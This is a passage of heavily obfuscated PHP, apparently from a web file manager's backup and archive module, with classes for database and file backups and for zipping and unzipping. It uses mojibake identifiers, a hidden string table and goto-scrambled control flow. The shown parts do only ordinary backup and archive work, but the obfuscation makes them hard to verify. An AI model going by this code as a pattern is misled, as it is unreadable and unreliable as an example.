$f¨Äí»˜ƒ´[191] => array($f¨Äí»˜ƒ´[731] => 0, $f¨Äí»˜ƒ´[740] => 0, $f¨Äí»˜ƒ´[741] => 0, $f¨Äí»˜ƒ´[742] => 0, $f¨Äí»˜ƒ´[743] => 0, $f¨Äí»˜ƒ´[441] => $DíÂ—„âÃÑ)), $f¨Äí»˜ƒ´[744] => time(), $f¨Äí»˜ƒ´[470] => 0); $DŒÄ™§³‚ = Model($f¨Äí»˜ƒ´[730])->insert($eÁ§‚Û†ã); goto e¾ ‰ÏàÉø; bêÎ‚¨ßˆÆ: } private function checkStore($dà·äãÃ©ê) { $AóÎ…ğÑÊ =& $_SERVER[…ë˜õ]; $cøï‡³¿ôÖ = Model($AóÎ…ğÑÊ[745])->listData($dà·äãÃ©ê); Model($AóÎ…ğÑÊ[745])->checkConfig($cøï‡³¿ôÖ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[…ë˜õ][730])->findByName(self::$name); } return self::$option; } public static function set($eµéÙ„¥›•) { $a”…›³³½è =& $_SERVER[…ë˜õ]; $B¸ã³ğÆø = self::get(); foreach ($eµéÙ„¥›• as $EÃÉõ…ÚÃã => $f†ğÈ„–â) { $F¬ìºõ¹ËÎ = explode($a”…›³³½è[94], $EÃÉõ…ÚÃã); $aõµ â©¹ß = count($F¬ìºõ¹ËÎ); switch ($aõµ â©¹ß) { case 1: $B¸ã³ğÆø[$F¬ìºõ¹ËÎ[0]] = $f†ğÈ„–â; break; case 2: $B¸ã³ğÆø[$F¬ìºõ¹ËÎ[0]][$F¬ìºõ¹ËÎ[1]] = $f†ğÈ„–â; break; case 3: $B¸ã³ğÆø[$F¬ìºõ¹ËÎ[0]][$F¬ìºõ¹ËÎ[1]][$F¬ìºõ¹ËÎ[2]] = $f†ğÈ„–â; break; } } Model($a”…›³³½è[730])->update($B¸ã³ğÆø[$a”…›³³½è[388]], $B¸ã³ğÆø); self::$option = $B¸ã³ğÆø; return self::$option; } public function keep() { $Bª–š¹‰´ =& $_SERVER[…ë˜õ]; $dÑÅÊ˜Â‹ = self::get(); if ($dÑÅÊ˜Â‹[$Bª–š¹‰´[289]][$Bª–š¹‰´[735]][$Bª–š¹‰´[731]] == $Bª–š¹‰´[86]) { return; } $this->backupKeep($dÑÅÊ˜Â‹); self::set(array($Bª–š¹‰´[746] => 1)); } private function backupKeep($cŒ™çÏèİ) { goto eÁŠ‘×”îÅ; aôÆ•ƒ×ÇÁ: for ($fÇŒÔõÜà = 0; $fÇŒÔõÜà < 12; $fÇŒÔõÜà++) { $C£ç™È¬š‘[] = date($AÊ©ò“˜®˜[747], strtotime("\55{$fÇŒÔõÜà}\x20\x6d\157\x6e\x74\x68\163")); } $C£ç™È¬š‘ = array_unique($C£ç™È¬š‘); foreach ($BåÜô­ÚòÍ as $eùæ¬‡¦¡) { if (!empty($eùæ¬‡¦¡[$AÊ©ò“˜®˜[28]]) && in_array($eùæ¬‡¦¡[$AÊ©ò“˜®˜[28]], $C£ç™È¬š‘)) { continue; } Model($AÊ©ò“˜®˜[730])->remove($eùæ¬‡¦¡[$AÊ©ò“˜®˜[388]]); $F¤¾ç­¬ƒ = "\173\151\157\72{$cŒ™çÏèİ[$AÊ©ò“˜®˜[733]]}\x7d\57\144\141\164\141\x62\x61\x73\x65\x2f\x62\141\143\x6b\x75\160\x5f{$eùæ¬‡¦¡[$AÊ©ò“˜®˜[28]]}"; IO::remove($F¤¾ç­¬ƒ, !1); } goto E†·„ÔÁ¡Î; CÙ¾­ªĞºÓ: $fÇŒÔõÜà = 0; $C£ç™È¬š‘ = array(); foreach ($BåÜô­ÚòÍ as $eùæ¬‡¦¡) { if ($fÇŒÔõÜà >= 7) { break; } $C£ç™È¬š‘[] = $eùæ¬‡¦¡[$AÊ©ò“˜®˜[28]]; $fÇŒÔõÜà++; } goto aôÆ•ƒ×ÇÁ; eÁŠ‘×”îÅ: $AÊ©ò“˜®˜ =& $_SERVER[…ë˜õ]; $BåÜô­ÚòÍ = Model($AÊ©ò“˜®˜[730])->listData(); if (empty($BåÜô­ÚòÍ)) { return; } goto CÙ¾­ªĞºÓ; E†·„ÔÁ¡Î: } public function db() { goto CÊ‡æºº; BÀã‰©é¦: $dÙàƒ»é = new BackupDb(); if (!$dÙàƒ»é->index()) { return !1; } self::set(array($b´ˆ »ß¯›[748] => 1)); goto b²¾ÃÉ’¡; CÊ‡æºº: $b´ˆ »ß¯› =& $_SERVER[…ë˜õ]; $B±¨¼Âåª = self::get(); if ($B±¨¼Âåª[$b´ˆ »ß¯›[289]][$b´ˆ »ß¯›[736]][$b´ˆ »ß¯›[731]] == $b´ˆ »ß¯›[86]) { return !0; } goto BÀã‰©é¦; b²¾ÃÉ’¡: return !0; goto bÚÁšæ‘î–; bÚÁšæ‘î–: } public function dbFile() { goto bÚÕŞ›îì; bÚÕŞ›îì: $e…™±¨÷Œ =& $_SERVER[…ë˜õ]; $dÀ£›İ‚Û­ = self::get(); if ($dÀ£›İ‚Û­[$e…™±¨÷Œ[289]][$e…™±¨÷Œ[739]][$e…™±¨÷Œ[731]] == $e…™±¨÷Œ[86]) { return !0; } goto dğÅÜñ´ê; dğÅÜñ´ê: $bË§‚ŸœõÌ = new BackupDbFile(); if (!$bË§‚ŸœõÌ->index()) { return !1; } self::set(array($e…™±¨÷Œ[749] => 1)); goto D¯´ÕÀƒáá; D¯´ÕÀƒáá: return !0; goto bª‹òé™•‘; bª‹òé™•‘: } public function file() { $aÆİÖÃ‘àÍ =& $_SERVER[…ë˜õ]; $D·êŞš‡Ø× = self::get(); if ($D·êŞš‡Ø×[$aÆİÖÃ‘àÍ[289]][$aÆİÖÃ‘àÍ[191]][$aÆİÖÃ‘àÍ[731]] == $aÆİÖÃ‘àÍ[86]) { return !0; } if (!isset($D·êŞš‡Ø×[$aÆİÖÃ‘àÍ[734]]) || $D·êŞš‡Ø×[$aÆİÖÃ‘àÍ[734]] == $aÆİÖÃ‘àÍ[491]) { $a¤‹ˆ¤±î = new BackupFile(); if (!$a¤‹ˆ¤±î->index()) { return !1; } } self::set(array($aÆİÖÃ‘àÍ[750] => 1, $aÆİÖÃ‘àÍ[731] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto AéÍŠçè¯ğ; Fë·â£©Êæ: $CÏ¼¼º› = array_diff($CÏ¼¼º›, array($b‚¿†æ‹—é[752], $b‚¿†æ‹—é[753])); foreach ($CÏ¼¼º› as $aÉ¥Œ‹øÈİ) { $f†Æº’¸¬‹ += $B§¥—í¾§®->model($aÉ¥Œ‹øÈİ)->count(); } $cØ¬ÖÛ·ö‘ = new Task($b‚¿†æ‹—é[754], $b‚¿†æ‹—é[755], $f†Æº’¸¬‹, LNG($b‚¿†æ‹—é[756]) . $b‚¿†æ‹—é[757] . LNG($b‚¿†æ‹—é[758])); goto CËÆÜ²ƒËÒ; DÀŒ‰ Øø¾: mk_dir($bº¥Ü–ËÀ®); $f†Æº’¸¬‹ = $a æŸé×¢† = 0; try { $CÏ¼¼º› = $B§¥—í¾§®->db()->getTables(); } catch (Exception $BµƒÔ¡­Î) { return !1; } goto Fë·â£©Êæ; AéÍŠçè¯ğ: $b‚¿†æ‹—é =& $_SERVER[…ë˜õ]; $a–‘Ç×£•¸ = Backup::get(); self::$io = $a–‘Ç×£•¸[$b‚¿†æ‹—é[733]]; goto Bå„Úœ°‘—; b’ôœ¨µù¡: $e’†¬š–¶µ = array($b‚¿†æ‹—é[763] => $C¬“Ó²æÆ, $b‚¿†æ‹—é[748] => 1, $b‚¿†æ‹—é[764] => $f†Æº’¸¬‹, $b‚¿†æ‹—é[765] => $a æŸé×¢†); Backup::set($e’†¬š–¶µ); if ($f†Æº’¸¬‹ > $a æŸé×¢†) { return !1; } goto C©à¯…Ââ; C©à¯…Ââ: return !0; goto aó‡ĞÓÁ¶ˆ; b¥¸øãŸóÃ: $B§¥—í¾§® = new DbManage($b—Û˜¤Ë‹é, $C¬“Ó²æÆ); $bº¥Ü–ËÀ® = TEMP_FILES . $b‚¿†æ‹—é[751] . self::$name . $b‚¿†æ‹—é[8]; del_dir($bº¥Ü–ËÀ®); goto DÀŒ‰ Øø¾; Bå„Úœ°‘—: self::$name = $a–‘Ç×£•¸[$b‚¿†æ‹—é[28]]; $b—Û˜¤Ë‹é = $GLOBALS[$b‚¿†æ‹—é[6]][$b‚¿†æ‹—é[17]]; $C¬“Ó²æÆ = $this->_dbType($b—Û˜¤Ë‹é); goto b¥¸øãŸóÃ; CËÆÜ²ƒËÒ: foreach ($CÏ¼¼º› as $aÉ¥Œ‹øÈİ) { $F†˜É°ô = $bº¥Ü–ËÀ® . $aÉ¥Œ‹øÈİ . $b‚¿†æ‹—é[759]; $B–ô²ğÉ†Ÿ = null; if ($aÉ¥Œ‹øÈİ == $b‚¿†æ‹—é[760] && (!isset($a–‘Ç×£•¸[$b‚¿†æ‹—é[734]]) || $a–‘Ç×£•¸[$b‚¿†æ‹—é[734]] == $b‚¿†æ‹—é[491])) { $B–ô²ğÉ†Ÿ = self::$io; } $a æŸé×¢† += $B§¥—í¾§®->sqlFromDb($aÉ¥Œ‹øÈİ, $F†˜É°ô, $cØ¬ÖÛ·ö‘, $B–ô²ğÉ†Ÿ); } if (isset($cØ¬ÖÛ·ö‘->task[$b‚¿†æ‹—é[761]])) { $CÓÖôëè³‚ = $cØ¬ÖÛ·ö‘->task[$b‚¿†æ‹—é[761]] ? $cØ¬ÖÛ·ö‘->task[$b‚¿†æ‹—é[761]] : timeFloat(); $c¶ìİØ…›õ = $CÓÖôëè³‚ - $cØ¬ÖÛ·ö‘->task[$b‚¿†æ‹—é[762]]; if ($c¶ìİØ…›õ >= 0.2) { $f†Æº’¸¬‹ += 1; } } $cØ¬ÖÛ·ö‘->end(); goto b’ôœ¨µù¡; aó‡ĞÓÁ¶ˆ: } private function _dbType($BëŞ‘èÀ¿µ) { goto D¶­ŒŸ®´Ö; dÕ” æÚÊˆ: if ($FÎÕÀ½ˆ¡¡ == $E’†×Û²ñ£[767]) { $BœÏÈ”§‡ = explode($E’†×Û²ñ£[4], $BëŞ‘èÀ¿µ[$E’†×Û²ñ£[768]]); $FÎÕÀ½ˆ¡¡ = $BœÏÈ”§‡[0]; } $eÇÏ‚ñ‡Î = array($E’†×Û²ñ£[769] => $E’†×Û²ñ£[9], $E’†×Û²ñ£[770] => $E’†×Û²ñ£[771]); if (isset($eÇÏ‚ñ‡Î[$FÎÕÀ½ˆ¡¡])) { $FÎÕÀ½ˆ¡¡ = $eÇÏ‚ñ‡Î[$FÎÕÀ½ˆ¡¡]; } goto a‰ÛáÃÃÁ; a‰ÛáÃÃÁ: return $FÎÕÀ½ˆ¡¡; goto EÜõãŒƒˆ‡; D¶­ŒŸ®´Ö: $E’†×Û²ñ£ =& $_SERVER[…ë˜õ]; $BëŞ‘èÀ¿µ = array_change_key_case($BëŞ‘èÀ¿µ); $FÎÕÀ½ˆ¡¡ = $BëŞ‘èÀ¿µ[$E’†×Û²ñ£[766]]; goto dÕ” æÚÊˆ; EÜõãŒƒˆ‡: } } class BackupDbFile { public function __construct() { } public function index() { goto aˆ…ˆ…Ó‚‰; DÕ—òŠ¥£Û: $f½Ò¯«æ÷“ = CONTROLLER_DIR . $C¡Ò«Óç‚[778]; IO::copy($e…Öä–²Ÿ–, $B»ºù—ß‰); IO::copy($f½Ò¯«æ÷“, $B»ºù—ß‰); goto CÚÁ”–Ê¡; dõƒ÷…´¿Â: $e¢“Ã ê“ˆ = IO::listPath($a„»ƒÕˆĞ); $F­×Ø¯°èª = isset($e¢“Ã ê“ˆ[$C¡Ò«Óç‚[73]]) ? $e¢“Ã ê“ˆ[$C¡Ò«Óç‚[73]] : array(); $E‘í¥©ÃÑ© = array_sum(array_column($F­×Ø¯°èª, $C¡Ò«Óç‚[77])); goto a“ˆâá®³¿; aˆ…ˆ…Ó‚‰: $C¡Ò«Óç‚ =& $_SERVER[…ë˜õ]; $CÖé„Ä¥´ = Backup::get(); $eÏ°ĞÇ¿Î“ = $CÖé„Ä¥´[$C¡Ò«Óç‚[28]]; goto aøÓ®°ˆğ; a“ˆâá®³¿: if (!$E‘í¥©ÃÑ©) { return !1; } Backup::set(array($C¡Ò«Óç‚[772] => $E‘í¥©ÃÑ©)); $FêÌ°¡Ú’÷ = new TaskFileTransfer($C¡Ò«Óç‚[773], $C¡Ò«Óç‚[755], count($F­×Ø¯°èª), LNG($C¡Ò«Óç‚[756]) . $C¡Ò«Óç‚[434] . LNG($C¡Ò«Óç‚[758]) . $C¡Ò«Óç‚[774]); goto FÖ…ôùù®; FÖ…ôùù®: $FêÌ°¡Ú’÷->task[$C¡Ò«Óç‚[740]] = $E‘í¥©ÃÑ©; foreach ($e¢“Ã ê“ˆ[$C¡Ò«Óç‚[73]] as $EÎµ­­Ÿ‚¨) { $D¿ÚÒ¬˜‹Ù = IO::move($EÎµ­­Ÿ‚¨[$C¡Ò«Óç‚[75]], $B»ºù—ß‰); if (!$D¿ÚÒ¬˜‹Ù) { $FêÌ°¡Ú’÷->end(); $a‚Œç±¸Ù = IO::getLastError($C¡Ò«Óç‚[775] . $EÎµ­­Ÿ‚¨[$C¡Ò«Óç‚[75]] . $C¡Ò«Óç‚[776] . $B»ºù—ß‰ . $C¡Ò«Óç‚[499]); write_log($a‚Œç±¸Ù, $C¡Ò«Óç‚[755]); return !1; } } $e…Öä–²Ÿ– = CONTROLLER_DIR . $C¡Ò«Óç‚[777]; goto DÕ—òŠ¥£Û; CÚÁ”–Ê¡: $FêÌ°¡Ú’÷->end(); Backup::set(array($C¡Ò«Óç‚[779] => $E‘í¥©ÃÑ©)); return !0; goto B•ÈÙ©ˆ™¯; aøÓ®°ˆğ: $a„»ƒÕˆĞ = TEMP_FILES . "\142\x61\143\x6b\165\x70\137{$eÏ°ĞÇ¿Î“}\x2f"; $B»ºù—ß‰ = "\173\x69\157\x3a{$CÖé„Ä¥´[$C¡Ò«Óç‚[733]]}\175\57\144\x61\x74\141\142\141\x73\x65\57\x62\x61\x63\153\165\160\x5f{$eÏ°ĞÇ¿Î“}\57"; if (!($B»ºù—ß‰ = IO::mkdir($B»ºù—ß‰))) { return !1; } goto dõƒ÷…´¿Â; B•ÈÙ©ˆ™¯: } } goto d‰½‡¿‚ƒÜ; F‡äÛ‘æ¿»: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f“Åâ†â§‡; if (!$f“Åâ†â§‡) { $AšÈøŸ¡¦ä = IO::init($_SERVER[…ë˜õ][8]); } return $AšÈøŸ¡¦ä; } private static function iconvSystem($cÀõ×¬Ë) { return self::local()->iconvSystem($cÀõ×¬Ë); } private static function iconvApp($B¢Ÿì»àùï) { return self::local()->iconvApp($B¢Ÿì»àùï); } public static function zip($a†­õ’Á, $DâŒ¥›ø”‰ = "\172\x69\x70", $c¿ÕÇ©™ã = '', $bÏ©ØÓ£Ø‹ = REPEAT_RENAME) { goto C¥…‡ÈÙîË; b³ÏÍ­à¦: foreach ($D‡ÈîÉ¶†ê as $cöÖ»ìõÖÁ => $eù˜¹«ó) { $D‡ÈîÉ¶†ê[$cöÖ»ìõÖÁ] = self::iconvSystem($eù˜¹«ó); } KodArchive::create($aÖÙ•± š³, $D‡ÈîÉ¶†ê); if (!IO::exist($C»ñĞÈÖ¿«)) { if ($FÔÑÈßøÙé) { del_dir($FÔÑÈßøÙé); } show_json(LNG($cë³ßä–±Ü[1086]), !1); } goto Bˆè•Ğ‹›ë; C¥…‡ÈÙîË: $cë³ßä–±Ü =& $_SERVER[…ë˜õ]; $D¸¨¹ØÔà = self::init($a†­õ’Á[0][$cë³ßä–±Ü[75]]); $Câ©ğËƒ½ = self::info($a†­õ’Á[0][$cë³ßä–±Ü[75]]); goto bˆªê§©Ÿ•; dÎÎ–ß«º¸: if (count($D‡ÈîÉ¶†ê) > 1) { $Aë¡‚ö = IO::info(IO::pathFather($Câ©ğËƒ½[$cë³ßä–±Ü[75]])); $A„ŞÕŠğ® = $Aë¡‚ö[$cë³ßä–±Ü[28]]; } $bÌÁç¿‚è = $FÔÑÈßøÙé; if (!$bÌÁç¿‚è) { $bÌÁç¿‚è = get_path_father($Câ©ğËƒ½[$cë³ßä–±Ü[75]]); if (!$c¿ÕÇ©™ã && $D¸¨¹ØÔà->getType() == $cë³ßä–±Ü[105]) { $bÌÁç¿‚è = get_path_father($D¸¨¹ØÔà->path); } $Cë §—õ¬ğ = IO::info($bÌÁç¿‚è); if (!$Cë §—õ¬ğ[$cë³ßä–±Ü[194]]) { show_json(LNG($cë³ßä–±Ü[1085]), !1); } } goto E«¤ç ¸ÛÃ; Bˆè•Ğ‹›ë: if ($c¿ÕÇ©™ã || !$FÔÑÈßøÙé) { if ($FÔÑÈßøÙé && strstr($FÔÑÈßøÙé, TEMP_FILES)) { $D¨µ½šÛ±Ÿ = $D‡ÈîÉ¶†ê = array(); recursion_dir($bÌÁç¿‚è, $D¨µ½šÛ±Ÿ, $D‡ÈîÉ¶†ê, 0); foreach ($D¨µ½šÛ±Ÿ as $c¤ïï›Ïº§) { del_dir($c¤ïï›Ïº§); } foreach ($D‡ÈîÉ¶†ê as $eïî›ç•İÙ) { if ($eïî›ç•İÙ == $aÖÙ•± š³) { continue; } del_file($eïî›ç•İÙ); } } return $C»ñĞÈÖ¿«; } $Aœ²ÃÖ¡‚² = self::pathFather($Câ©ğËƒ½[$cë³ßä–±Ü[75]]); $bİ¨¹„›Ï™ = self::move($C»ñĞÈÖ¿«, $Aœ²ÃÖ¡‚², $bÏ©ØÓ£Ø‹); goto dÌïÑšÊ§Ü; bˆªê§©Ÿ•: $FÔÑÈßøÙé = !1; if (!$c¿ÕÇ©™ã && $D¸¨¹ØÔà->getType() == $cë³ßä–±Ü[105]) { $D‡ÈîÉ¶†ê = self::zipFileList($a†­õ’Á); } else { $FÔÑÈßøÙé = $c¿ÕÇ©™ã ? $c¿ÕÇ©™ã : TEMP_FILES . $cë³ßä–±Ü[1084] . time() . rand_string(8) . $cë³ßä–±Ü[8]; mk_dir($FÔÑÈßøÙé); $D‡ÈîÉ¶†ê = self::zipFileList($a†­õ’Á, $FÔÑÈßøÙé); } $A„ŞÕŠğ® = $Câ©ğËƒ½[$cë³ßä–±Ü[28]]; goto dÎÎ–ß«º¸; dÌïÑšÊ§Ü: if (!$bİ¨¹„›Ï™) { del_dir($FÔÑÈßøÙé); show_json(LNG($cë³ßä–±Ü[1086]), !1); } del_dir($FÔÑÈßøÙé); return $bİ¨¹„›Ï™; goto eïçïÍ¼‹ù; E«¤ç ¸ÛÃ: $C»ñĞÈÖ¿« = $bÌÁç¿‚è . $A„ŞÕŠğ® . $cë³ßä–±Ü[94] . $DâŒ¥›ø”‰; $C»ñĞÈÖ¿« = get_filename_auto($C»ñĞÈÖ¿«, $cë³ßä–±Ü[33], $bÏ©ØÓ£Ø‹); $aÖÙ•± š³ = self::iconvSystem($C»ñĞÈÖ¿«); goto b³ÏÍ­à¦; eïçïÍ¼‹ù: } public static function unzip($c•¤ˆ½î¦ó, $A‹ô›“…±š = "\x72\x65\x70\x6c\141\143\145") { goto Fâ§õ²„³Í; aÅˆÔ®Ö©’: $b¹Ïçè–¼ñ = self::tmpFileName($a›…Á¨‚); $dÂ‡ÎÒ•„â = TEMP_FILES . $b¹Ïçè–¼ñ; del_dir($dÂ‡ÎÒ•„â); goto BØ‚‚‹Ú¹ê; cÚî­Ğµ•·: $AíÃ«Ä¾¾ = KodArchive::extract($C·¹èß¶¸¤, $dÂ‡ÎÒ•„â . $d†ˆŒ˜ŸË[8], $B’íÙŸ¤£); self::archiveExt(); if (!$AíÃ«Ä¾¾[$d†ˆŒ˜ŸË[1091]]) { show_json($d†ˆŒ˜ŸË[1092] . $AíÃ«Ä¾¾[$d†ˆŒ˜ŸË[1093]], !1); } goto f·åË¨ÍÌ; Fôòë£šÃÇ: if (!@file_exists(self::iconvSystem($C·¹èß¶¸¤))) { $C‘ĞĞ°ğŞø = self::localFilePath($eË¼îë¡Æ, $C‘ëˆŸ›‡); $C·¹èß¶¸¤ = $C‘ĞĞ°ğŞø ? $C‘ĞĞ°ğŞø : parent::download($eË¼îë¡Æ, $C·¹èß¶¸¤); } $C·¹èß¶¸¤ = self::iconvSystem($C·¹èß¶¸¤); $B’íÙŸ¤£ = isset($c•¤ˆ½î¦ó[$d†ˆŒ˜ŸË[1089]]) ? $c•¤ˆ½î¦ó[$d†ˆŒ˜ŸË[1089]] : $d†ˆŒ˜ŸË[1090]; goto cÚî­Ğµ•·; BØ‚‚‹Ú¹ê: mk_dir($dÂ‡ÎÒ•„â); $C‘ëˆŸ›‡ = self::fileExt($a›…Á¨‚); $C·¹èß¶¸¤ = $dÂ‡ÎÒ•„â . $d†ˆŒ˜ŸË[94] . $C‘ëˆŸ›‡; goto Fôòë£šÃÇ; Fâ§õ²„³Í: $d†ˆŒ˜ŸË =& $_SERVER[…ë˜õ]; $eË¼îë¡Æ = $c•¤ˆ½î¦ó[$d†ˆŒ˜ŸË[75]]; $EŞõ†¢íØ = $c•¤ˆ½î¦ó[$d†ˆŒ˜ŸË[1087]]; goto E‰ä”‡¾º; f·åË¨ÍÌ: Hook::trigger($d†ˆŒ˜ŸË[1094], $dÂ‡ÎÒ•„â); recursion_dir($dÂ‡ÎÒ•„â, $AÕÊÃœÀªÓ, $E—â÷—„®Ï, 0); $FèÀå¨âË = array_merge($AÕÊÃœÀªÓ, $E—â÷—„®Ï); goto fá¿¶é§õ‚; E‰ä”‡¾º: if (!($a›…Á¨‚ = parent::info($eË¼îë¡Æ))) { show_json(LNG($d†ˆŒ˜ŸË[1088]), !1); } if (!($d˜¾ËÚÍÖ = parent::infoFull($EŞõ†¢íØ))) { $EŞõ†¢íØ = parent::mkdir($EŞõ†¢íØ); $d˜¾ËÚÍÖ = array($d†ˆŒ˜ŸË[75] => $EŞõ†¢íØ); } else { if (isset($d˜¾ËÚÍÖ[$d†ˆŒ˜ŸË[390]]) && trim($d˜¾ËÚÍÖ[$d†ˆŒ˜ŸË[75]], $d†ˆŒ˜ŸË[8]) != trim($EŞõ†¢íØ, $d†ˆŒ˜ŸË[8])) { $b‚İöŞùÛç = KodIO::make($d˜¾ËÚÍÖ[$d†ˆŒ˜ŸË[472]]); $AòßìÍ¶Í = parent::fileNameAuto($b‚İöŞùÛç, $d˜¾ËÚÍÖ[$d†ˆŒ˜ŸË[28]], REPEAT_RENAME_FOLDER, !0); $EŞõ†¢íØ = parent::mkdir($b‚İöŞùÛç . $AòßìÍ¶Í); $d˜¾ËÚÍÖ = array($d†ˆŒ˜ŸË[75] => $EŞõ†¢íØ); } } $EŞõ†¢íØ = $d˜¾ËÚÍÖ[$d†ˆŒ˜ŸË[75]]; goto aÅˆÔ®Ö©’; fá¿¶é§õ‚: foreach ($FèÀå¨âË as $D˜¥ÇƒÇÀÃ) { $D˜¥ÇƒÇÀÃ = self::iconvApp($D˜¥ÇƒÇÀÃ); self::move($D˜¥ÇƒÇÀÃ, $EŞõ†¢íØ, $A‹ô›“…±š); } del_dir($dÂ‡ÎÒ•„â); if (!$C‘ĞĞ°ğŞø) { del_file($C·¹èß¶¸¤); } goto bñ²Èê«ñ©; bñ²Èê«ñ©: return !0; goto E’äŠ¡ÅÓ£; E’äŠ¡ÅÓ£: } public static function unzipList($CµœìéâÎÇ) { goto FÔ‡‘æ›ê; C¤¶·˜ƒ“ğ: if (!is_dir($e™×èÑ×È÷)) { mk_dir($e™×èÑ×È÷); } $a» ©©¢â = $e™×èÑ×È÷ . $d¡ºÊ¨İ£á[8] . $DÆ¶Ã÷–‹¢; if (!@file_exists(self::iconvSystem($a» ©©¢â))) { if (isset($a«ï³ˆİš„)) { url_request($bàÓ‚·é¬ù, $d¡ºÊ¨İ£á[1098], $a» ©©¢â); } else { $c—‹›¨÷õÂ = self::localFilePath($bàÓ‚·é¬ù, $C•ƒô«‹—Ú); $a» ©©¢â = $c—‹›¨÷õÂ ? $c—‹›¨÷õÂ : self::download($bàÓ‚·é¬ù, $a» ©©¢â); } } goto AÔŞ¯Ñô³; FøÆ¸Àæ»­: self::archiveExt(); del_dir($e™×èÑ×È÷); if (!$Bğô©ƒàš›[$d¡ºÊ¨İ£á[1091]]) { show_json($Bğô©ƒàš›[$d¡ºÊ¨İ£á[1093]], !1); } goto bºƒŒ‹¿Ù˜; bºƒŒ‹¿Ù˜: $e”Ñèµ÷¼‹ = json_encode($Bğô©ƒàš›[$d¡ºÊ¨İ£á[1093]]); self::setContent($e‚£óÆ‰³…, $e”Ñèµ÷¼‹); if (count($Bğô©ƒàš›[$d¡ºÊ¨İ£á[1093]]) >= $FíÁ¶Šº) { show_json(sprintf(LNG($d¡ºÊ¨İ£á[1097]), count($Bğô©ƒàš›[$d¡ºÊ¨İ£á[1093]])), !1); } goto Eª‹åĞ³Å©; FÔ‡‘æ›ê: $d¡ºÊ¨İ£á =& $_SERVER[…ë˜õ]; $bàÓ‚·é¬ù = $CµœìéâÎÇ[$d¡ºÊ¨İ£á[75]]; $f£Ûàßíå® = isset($CµœìéâÎÇ[$d¡ºÊ¨İ£á[1095]]) ? $CµœìéâÎÇ[$d¡ºÊ¨İ£á[1095]] : -1; goto a™—ƒ²‹¥¨; AÔŞ¯Ñô³: $a» ©©¢â = self::iconvSystem($a» ©©¢â); if ($f£Ûàßíå® >= 0) { $aà¤¿ÚÑÜÑ = isset($CµœìéâÎÇ[$d¡ºÊ¨İ£á[1099]]) ? $CµœìéâÎÇ[$d¡ºÊ¨İ£á[1099]] : !1; $B»Ó’ˆÊÑÔ = isset($CµœìéâÎÇ[$d¡ºÊ¨İ£á[28]]) ? $CµœìéâÎÇ[$d¡ºÊ¨İ£á[28]] : $d¡ºÊ¨İ£á[33]; KodArchive::filePreview($a» ©©¢â, $f£Ûàßíå®, $aà¤¿ÚÑÜÑ, $B»Ó’ˆÊÑÔ); self::archiveExt(); die; } $Bğô©ƒàš› = KodArchive::listContent($a» ©©¢â); goto FøÆ¸Àæ»­; Eª‹åĞ³Å©: return $Bğô©ƒàš›[$d¡ºÊ¨İ£á[1093]]; goto b›…Åš®ˆÓ; AŞ™ÖŞ¨Æ•: $B™¿ì¥…ç = self::info($BÊä”¥ğ¦í); $C•ƒô«‹—Ú = self::fileExt($B™¿ì¥…ç); $fæôÙˆÖäŞ = self::tmpFileName($B™¿ì¥…ç); goto eñß‹Ó±Œ; a™—ƒ²‹¥¨: $FíÁ¶Šº = 50000; if (request_url_safe($bàÓ‚·é¬ù)) { $a«ï³ˆİš„ = parse_url_query($bàÓ‚·é¬ù); if (!isset($a«ï³ˆİš„[$d¡ºÊ¨İ£á[75]])) { show_json($d¡ºÊ¨İ£á[1096], !1); } } $BÊä”¥ğ¦í = isset($a«ï³ˆİš„) ? $a«ï³ˆİš„[$d¡ºÊ¨İ£á[75]] : $bàÓ‚·é¬ù; goto AŞ™ÖŞ¨Æ•; eñß‹Ó±Œ: if (isset($a«ï³ˆİš„)) { $c‰ïâ®×»© = array($a«ï³ˆİš„[$d¡ºÊ¨İ£á[75]], $a«ï³ˆİš„[$d¡ºÊ¨İ£á[1095]], $a«ï³ˆİš„[$d¡ºÊ¨İ£á[28]]); $DÆ¶Ã÷–‹¢ = md5(implode($d¡ºÊ¨İ£á[70], $c‰ïâ®×»©)) . $d¡ºÊ¨İ£á[94] . get_path_ext($a«ï³ˆİš„[$d¡ºÊ¨İ£á[28]]); } else { $c‰ïâ®×»© = array($B™¿ì¥…ç[$d¡ºÊ¨İ£á[28]], $B™¿ì¥…ç[$d¡ºÊ¨İ£á[75]], $B™¿ì¥…ç[$d¡ºÊ¨İ£á[77]]); $DÆ¶Ã÷–‹¢ = md5(implode($d¡ºÊ¨İ£á[70], $c‰ïâ®×»©)) . $d¡ºÊ¨İ£á[94] . $C•ƒô«‹—Ú; } if ($f£Ûàßíå® == -1) { $e‚£óÆ‰³… = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\145\x77\x2f{$fæôÙˆÖäŞ}\x2f{$DÆ¶Ã÷–‹¢}\x2e\154\157\x67"; $c½‚ŒˆÄ‡† = self::infoFull($e‚£óÆ‰³…); if ($c½‚ŒˆÄ‡†) { $e‚£óÆ‰³… = $c½‚ŒˆÄ‡†[$d¡ºÊ¨İ£á[75]]; $eàÎª¶¦Ñƒ = self::getContent($e‚£óÆ‰³…); if ($eàÎª¶¦Ñƒ) { $e”Ñèµ÷¼‹ = json_decode($eàÎª¶¦Ñƒ, !0); if (count($e”Ñèµ÷¼‹) >= $FíÁ¶Šº) { show_json(sprintf(LNG($d¡ºÊ¨İ£á[1097]), count($e”Ñèµ÷¼‹)), !1); } return $e”Ñèµ÷¼‹; } } else { $e‚£óÆ‰³… = self::mkfile($e‚£óÆ‰³…); } } $e™×èÑ×È÷ = TEMP_FILES . $fæôÙˆÖäŞ; goto C¤¶·˜ƒ“ğ; b›…Åš®ˆÓ: } private static function fileExt($aƒç¹²ÉÃ) { $B™òøÊé¹ =& $_SERVER[…ë˜õ]; $E†•›ÉÊ¬£ = $aƒç¹²ÉÃ[$B™òøÊé¹[167]]; if ($E†•›ÉÊ¬£ == $B™òøÊé¹[1100]) { $eÏŠ¡â‚éÔ = $B™òøÊé¹[1101]; if (substr($aƒç¹²ÉÃ[$B™òøÊé¹[28]], -strlen($eÏŠ¡â‚éÔ)) == $eÏŠ¡â‚éÔ) { $E†•›ÉÊ¬£ = $B™òøÊé¹[1102]; } } self::archiveExt($E†•›ÉÊ¬£); return $E†•›ÉÊ¬£; } private static function zipFileList($c‘¢â¥ŠÓù, $eÕÃ™ë†„ = false) { $AÉ´ÈÏ¦«² =& $_SERVER[…ë˜õ]; $eÅ­ÀŒËô = array(); foreach 